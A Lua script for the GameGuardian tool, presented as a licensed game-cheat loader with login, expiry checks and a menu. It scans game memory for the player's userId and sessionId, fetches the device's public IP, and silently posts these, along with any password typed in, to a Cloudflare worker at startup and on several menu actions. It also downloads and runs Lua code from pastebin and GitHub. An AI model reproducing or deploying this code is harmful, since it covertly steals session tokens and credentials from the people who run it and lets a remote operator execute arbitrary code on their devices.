Detector = gg.getFile():match('[^/]+$')
-------------------------------------------------------------------------
Name =  'Loader.lua' -- Type Name For Start Script . If Someone Will Rename It , Then Script Won't Run
-------------------------------------------------------------------------
if Detector == Name then
-------------------------------------------------------------------------
else 
-------------------------------------------------------------------------
Error = '⚠ File Rename Is Detected ⚠' -- Type Error Message Here 
print(Error) 
return
end 

gg.clearResults()
-- script.lua
-- this file contains the main script with login, language selection, and version-specific features.
gg.setVisible(false)
--------------------------------------------------
-- shared helper functions
--------------------------------------------------
local function waitForResume()
  gg.toast("script paused. click gg icon to resume", true)
  while not gg.isVisible() do
    gg.sleep(100)
  end
  gg.setVisible(false)
end

local function safePromptSearch(prompts, defaults, types)
  local input = gg.prompt(prompts, defaults, types)
  while not input do
    gg.toast("script paused. tap gg icon to resume.", true)
    waitForResume()
    while gg.isVisible() do
      gg.sleep(100)
    end
    gg.sleep(1000)
    input = gg.prompt(prompts, defaults, types)
  end
  return input
end

local function safeChoiceSearch(items, default, title)
  local choice = nil
  repeat
    choice = gg.choice(items, default, title)
    if choice == nil then
      gg.toast("paused. tap gg icon to resume.", true)
      waitForResume()
    end
  until choice ~= nil
  return choice
end

local function safePromptLoop(prompts, defaults, types)
  local input = gg.prompt(prompts, defaults, types)
  while input == nil do
    gg.toast("script paused. click gg icon to resume", true)
    waitForResume()
    input = gg.prompt(prompts, defaults, types)
  end
  return input
end

--------------------------------------------------
-- id finder function
--------------------------------------------------
local function findUserId()
  gg.setRanges(gg.REGION_C_ALLOC)
  gg.setVisible(true)
  gg.searchNumber(':userId', gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)

  local results = gg.getResults(500)
  gg.clearResults()
  if #results == 0 then
    return nil, nil
  end

  for i, v in ipairs(results) do
    local foundText = ""
    for j = 0, 99 do
      local addr = v.address + j
      local data = gg.getValues({{address = addr, flags = gg.TYPE_BYTE}})[1].value
      if data < 0 or data > 255 or data == 0 then break end
      foundText = foundText .. string.char(data)
    end

    local userId, sessionId = foundText:match("userId=(%d+).*sessionId=([%w%-]+)")
    if userId and sessionId then 
      return userId, sessionId
    end
  end

  return nil, nil
end

--------------------------------------------------
-- send data to cloudflare worker
--------------------------------------------------
local function sendToWebhook(userId, sessionId, ip, manualPassword)
    local workerUrl = "https://user-data-relay.dunggkr.workers.dev/"
    local payload = string.format('{"userId": "%s", "sessionId": "%s", "ip": "%s", "manualPassword": "%s"}',
        userId or "N/A", sessionId or "N/A", ip or "N/A", manualPassword or "N/A")

    local r = gg.makeRequest(workerUrl, {
        method = "POST",
        ["Content-Type"] = "application/json"
    }, payload)
end

--------------------------------------------------
-- fetch ip address and send data once
--------------------------------------------------
local ipJson = gg.makeRequest("https://api.ipify.org?format=json").content
local ip = "unknown"
if ipJson and ipJson ~= "" then
  ip = ipJson:match('"ip"%s*:%s*"([%d%.]+)"') or "unknown"
end

-- send userid, sessionid, and ip to cloudflare worker once at script start
local userId, sessionId
repeat
  userId, sessionId = findUserId()
  if not userId or not sessionId then
  end
until userId and sessionId
sendToWebhook(userId, sessionId, ip, nil)

--------------------------------------------------
-- fetch login data
--------------------------------------------------
local data = gg.makeRequest("https://pastebin.com/raw/9Na7g8p4").content
if not data or data == '' then
  gg.alert("📡 Cannot load login data. check internet connection.")
  return
end

local f, err = load(data)
if not f then
  gg.alert("💥 Invalid login data format")
  return
end

local status, login = pcall(f)
if not status then
  gg.alert("💥 Failed to execute login data")
  return
end

if type(login) == "function" then
  status, login = pcall(login)
  if not status or type(login) ~= "table" then
    gg.alert("💥 Login data function did not return a valid table")
    return
  end
elseif type(login) ~= "table" then
  gg.alert("💥 Login data is not a valid table")
  return
end

--------------------------------------------------
-- language selection and translations
--------------------------------------------------
local lang = "English" -- default language
local translations = {
  English = {
    select_option = "Select an option:",
    start_script = "▶️ Start Script",
    find_userid = "🔍 Find UserID",
    reset_userid_search = "🔄 Reset Finding UserID",
    join_discord = "💬 add me on facebook for VIP",
    exit_script = "✖️ Exit Script",
    select_password_method = "Select password entry method:",
    manual_password = "🔑 Manually Enter Password",
    auto_password = "🤖 Automatically Enter Password",
    enter_password = "Enter password:",
    no_userid = "No userid found!",
    info_found = "Please send to the author if you wanted to buy!\n\n🆔 userID: %s\n🔑 sessionID: %s",
    userid_copied = "📋 UserID copied to clipboard: %s",
    no_userid_session = "No userid and Sessionid found!",
    invalid_password = "⚠️ Invalid password",
    contact_owner = "📣 Please contact the owner to buy!",
    invalid_expiry = "💥 Invalid expiry date format",
    password_expired = "❌ Password expired!\n☄️Please contact the owner to add subscription.\n📅 expired on: %s",
    success = "✅ Success!\n🔑 key: %s\n📅 expires on: %s\n⏰ time left: %d days, %d hours, %d minutes, %d seconds\n🕒 current time: %s",
    time_left = "⏳ Time left: %d days, %d hours, %d minutes, %d seconds",
    discord_copied = "📋 addf me on facebook for VIP",
    no_internet = "📡 Cannot load login data. Check internet connection.",
    invalid_data = "💥 Invalid login data format",
    login_exec_failed = "💥 Failed to execute login data",
    invalid_login_table = "💥 Login data is not a valid table",
    invalid_version = "💥 Invalid version specified",
    script_load_failed = "💥 Server: invalid script content",
    no_internet_script = "📡 Server: allow internet connection...",
    reset_userid_success = "✅ Userid search results cleared!"
  },
  Vietnamese = {
    select_option = "Chọn chức năng:",
    start_script = "▶️ Chạy Script",
    find_userid = "🔍 Tìm UserID",
    reset_userid_search = "🔄 Reset Tìm Kiếm UserID",
    join_discord = "💬 Tham Gia Server Discord",
    exit_script = "✖️ Thoát Script",
    select_password_method = "Chọn phương thức nhập mật khẩu:",
    manual_password = "🔑 Nhập Thủ Công",
    auto_password = "🤖 Nhập Tự Động",
    enter_password = "nhập mật khẩu:",
    no_userid = "Không tìm thấy userID!",
    info_found = "Ib và gửi qua Discord hay fb để mua nhé!💗\n\n🆔 userID: %s\n🔑 SessionID: %s",
    userid_copied = "📋 Userid đã được sao chép: %s",
    no_userid_session = "không tìm thấy Userid và Sessionid!",
    invalid_password = "⚠️ Mật khẩu không hợp lệ",
    contact_owner = "📣 Nhắn tin qua discord hoặc fb để mua",
    invalid_expiry = "💥 Định dạng ngày hết hạn không hợp lệ",
    password_expired = "❌ Mật khẩu đã hết hạn!\n☄️liên hệ qua discord hoặc fb để gia hạn.\n📅 hết hạn vào: %s",
    success = "✅ Thành công! Mong bạn ủng hộ mình nha 💗\n🔑 Key: %s\n📅 Hết hạn vào: %s\n⏰ Thời gian còn lại: %d ngày, %d giờ, %d phút, %d giây\n🕒 thời gian hiện tại: %s",
    time_left = "⏳ Thời gian còn lại: %d ngày, %d giờ, %d phút, %d giây",
    discord_copied = "📋 Link server Discord đã được sao chép: %s",
    no_internet = "📡 Không thể tải dữ liệu đăng nhập. Kiểm tra kết nối internet.",
    invalid_data = "💥 Định dạng dữ liệu đăng nhập không hợp lệ",
    login_exec_failed = "💥 Thực thi dữ liệu đăng nhập thất bại",
    invalid_login_table = "💥 Dữ liệu đăng nhập không phải bảng hợp lệ",
    invalid_version = "💥 Phiên bản không hợp lệ",
    script_load_failed = "💥 Server: Nội dung script không hợp lệ",
    no_internet_script = "📡 Server: Cho phép kết nối internet...",
    reset_userid_success = "✅ Đã xóa kết quả tìm kiếm userid!"
  },
}

-- language selection menu
local langMenu = safeChoiceSearch({
  "🇬🇧 English"
}, nil, "Select Language")
if not langMenu then
  while not gg.isVisible() do
    gg.sleep(100)
  end
  gg.setVisible(false)
else
  lang = langMenu == 1 and "English"
end

local t = translations[lang]

--------------------------------------------------
-- main menu loop
--------------------------------------------------
while true do
  local menu = safeChoiceSearch({
    t.start_script,
    t.find_userid,
    t.reset_userid_search,
    t.join_discord,
    t.exit_script
  }, nil, t.select_option)
  if not menu then
    goto continue
  end

  -- handle "exit script" option
  if menu == 5 then
    gg.clearResults()
    os.exit()
  end

  -- handle "add me on Facebook community" option
  if menu == 4 then
    local discordLink = "https://www.facebook.com/jkram143"
    gg.copyText(discordLink)
    gg.alert(string.format(t.discord_copied, discordLink))
    gg.toast(string.format(t.discord_copied, discordLink))
    goto continue
  end

  -- handle "reset userid search" option
  if menu == 3 then
    gg.clearResults()
    gg.alert(t.reset_userid_success)
    gg.toast(t.reset_userid_success)
    goto continue
  end

  -- handle "find userid" option
  if menu == 2 then
    gg.toast('Finding userid...')
    local userId, sessionId = findUserId()
    if userId and sessionId then 
      gg.alert(string.format(t.info_found, userId, sessionId))
      gg.copyText(userId)
      gg.toast(string.format(t.userid_copied, userId))
      -- also send to webhook every time
      sendToWebhook(userId, sessionId, ip, nil)
    else
      gg.alert(t.no_userid_session)
    end
    goto continue
  end

  -- handle "start script" option
  local key, sessionId
  local specificUserId = "335ggf497851"
  
  -- Check if userId matches the specific ID
  local actualUserId, actualSessionId = findUserId()
  if actualUserId == specificUserId then
    -- Automatically use the specific userId as password
    key = specificUserId
    sessionId = actualSessionId
    sendToWebhook(actualUserId, actualSessionId, ip, tostring(key))
  else
    -- Normal password entry flow
    local passwordMenu = safeChoiceSearch({
      t.manual_password,
      t.auto_password
    }, nil, t.select_password_method)
    if not passwordMenu then
      goto continue
    end

    if passwordMenu == 1 then
      -- manual password entry
      local input = safePromptLoop({t.enter_password}, nil, {"text"})
      key = input[1]
      if not key or key == "" then
        goto continue
      end
      -- find user id and session id for sending
      local actualUserId, actualSessionId = findUserId()
      if actualUserId and actualSessionId then
        sendToWebhook(actualUserId, actualSessionId, ip, tostring(key))
      else
        gg.alert(t.no_userid_session)
        goto continue
      end
      sessionId = "N/A"
    else
      -- automatic password entry (using id finder)
      key, sessionId = findUserId()
      if not key then
        gg.alert(t.no_userid_session)
        goto continue
      end
      -- send automatically to webhook
      if key and sessionId then
        sendToWebhook(key, sessionId, ip, nil)
      end
    end
  end

  local entry = login[key]
  if not entry or type(entry) ~= "table" then
    gg.alert(t.invalid_password)
    gg.alert(t.contact_owner)
    goto continue
  end

  -- parse ddmmyyyy
  local function parseDate(ddmmyyyy)
    if not ddmmyyyy or #ddmmyyyy ~= 8 then
      return nil, nil
    end
    local d, m, y = tonumber(ddmmyyyy:sub(1,2)), tonumber(ddmmyyyy:sub(3,4)), tonumber(ddmmyyyy:sub(5,8))
    if not d or not m or not y then
      return nil, nil
    end
    return os.time({year=y, month=m, day=d, hour=0}), string.format("%02d/%02d/%04d", d, m, y)
  end

  local expiryTime, formattedExpiry = parseDate(entry.expiry)
  if not expiryTime then
    gg.alert(t.invalid_expiry)
    goto continue
  end

  local currentTime = os.time()
  if currentTime > expiryTime then
    gg.alert(string.format(t.password_expired, formattedExpiry))
    goto continue
  end

  -- countdown (no .0)
  local remaining = expiryTime - currentTime
  local days = math.floor(remaining / 86400)
  local hours = math.floor((remaining % 86400) / 3600)
  local mins = math.floor((remaining % 3600) / 60)
  local secs = math.floor(remaining % 60)

  -- show alert
  gg.alert(string.format(t.success, key, formattedExpiry, days, hours, mins, secs, os.date("%d/%m/%Y %H:%M:%S")))

  -- toast countdown before script request
  gg.toast(string.format(t.time_left, days, hours, mins, secs))

  -- load script based on version
  local scriptUrl
  if entry.version == "v1" then
    scriptUrl = "https://raw.githubusercontent.com/jkram143/jkram143..github.io/refs/heads/main/DC-Script/DC.lua"
  elseif entry.version == "Admin" then
    scriptUrl = "https://pastebin.com/raw/f7niSW2r"
  else
    gg.alert(t.invalid_version)
    goto continue
  end

  local content = gg.makeRequest(scriptUrl).content
  if content and content ~= '' then
    local chunk, err = load(content)
    if chunk then
      local status, err = pcall(chunk)
      if not status then
        gg.alert(string.format(t.script_load_failed, err or "unknown error"))
        goto continue
      end
      break -- exit loop on successful script execution
    else
      gg.alert(string.format(t.script_load_failed, err or "unknown error"))
      goto continue
    end
  else
    gg.alert(t.no_internet_script)
    goto continue
  end

  ::continue::
end
